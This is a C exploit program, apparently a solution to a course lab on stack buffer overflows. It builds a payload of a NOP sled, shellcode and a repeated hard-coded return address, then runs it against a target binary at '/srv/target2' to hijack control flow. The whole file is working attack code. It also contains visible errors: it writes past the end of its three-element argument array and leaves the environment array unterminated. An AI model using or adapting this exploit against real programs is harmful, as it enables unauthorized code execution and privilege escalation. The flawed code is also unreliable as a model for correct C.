#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"
#define BUFFER_SIZE 400
#define SHELLCODE_OFFSET 342
#define RETURN_ADDRESS 0xffffde18

const int PADDING_LENGTH = 8;

char* create_payload() {
    char* payload = (char*)malloc(BUFFER_SIZE);
    memset(payload, 0x90, BUFFER_SIZE);

    memcpy(payload + SHELLCODE_OFFSET, shellcode, strlen(shellcode));

    for (int i = SHELLCODE_OFFSET + strlen(shellcode); i < BUFFER_SIZE; i += 4) {
        *((uint32_t*)(payload + i)) = RETURN_ADDRESS;
    }

    return payload;
}

int main(void) {
    char* args[3];
    char* env[1];

    args[0] = TARGET;
    args[1] = create_payload();
    args[2] = "65935";
    args[3] = NULL;

    char padding[PADDING_LENGTH + 1];
    memset(padding, '0', PADDING_LENGTH);
    padding[PADDING_LENGTH] = '\0';

    env[0] = padding;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    free(args[1]);

    return 0;
}